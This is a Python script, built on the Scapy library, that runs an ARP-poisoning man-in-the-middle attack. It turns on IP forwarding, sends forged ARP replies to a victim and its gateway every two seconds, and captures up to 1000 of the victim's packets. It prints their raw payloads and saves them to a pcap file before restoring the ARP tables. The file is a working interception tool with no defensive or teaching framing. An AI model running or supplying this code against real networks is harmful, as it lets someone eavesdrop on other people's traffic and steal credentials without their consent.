from __future__ import print_function
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import os,time,sys,socket,struct
import threading

def MitM(victimIP, gatewayIP, interface, Filter):
	global Poisoning
	PACKET_COUNT = 1000
	print ('\n[*] Enabling IP Forwarding...')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	victimMAC = GetMac(victimIP, interface)
	if victimMAC==None:
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')        
		print('[!] Couldn\'t Find Victim MAC Address')
		print('[!] Exiting...')
		sys.exit(0)
	gatewayMAC = GetMac(gatewayIP, interface)
	if gatewayMAC==None:
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')        
		print('[!] Couldn\'t Find Gateway MAC Address')
		print('[!] Exiting...')
		sys.exit(0)
	# start poison thread
	Poisoning = True	
	poison_thread = threading.Thread(target=PoisonTarget, args=(victimIP, victimMAC, gatewayIP, gatewayMAC, interface))
	poison_thread.start()
	try:
		print ('[*] Starting sniffer for {} packets  \n'.format(PACKET_COUNT))
		bpf_filter = 'IP host ' + victimIP
		packets = sniff(filter=Filter, prn=GETPrint, count=PACKET_COUNT, iface=interface)
	except KeyboardInterrupt:
		pass
	wrpcap('results.pcap', packets)
	Poisoning = False
	# wait for poisoning thread to exit
	time.sleep(2)
	ReARP(victimIP, gatewayIP, interface)
	sys.exit(0)


def GetMac(ip, interface):
	conf.verb = 0
	ans, unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = ip), timeout = 0.01, iface =interface, inter = 0.01)
	for snd,rcv in ans:
		return rcv.sprintf(r'%Ether.src%')

def PoisonTarget(victimIP, victimMAC, gatewayIP, gatewayMAC, interface):
	print('[*] Poisoning Targets every 2 Seconds...')
	print('[*] Press Ctrl+C to Stop Poisoning and Restore Targets...')
	while (Poisoning):
		send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= victimMAC))
		send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gatewayMAC))
		time.sleep(2)
	print ("\n[*] ARP Poison Attack Finished.")
	return

def GETPrint(packet):
	return packet.sprintf("{Raw:%Raw.load%}")

def ReARP(victimIP, gatewayIP, interface):
	print ('[*] Restoring Targets...')
	victimMAC = GetMac(victimIP, interface)
	gatewayMAC = GetMac(gatewayIP, interface)
	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimMAC), count=7)
	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewayMAC), count=7)
	print('[*] Disabling IP Forwarding...')
	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
	print('[*] Successfully Completed.')
	sys.exit(0)
    
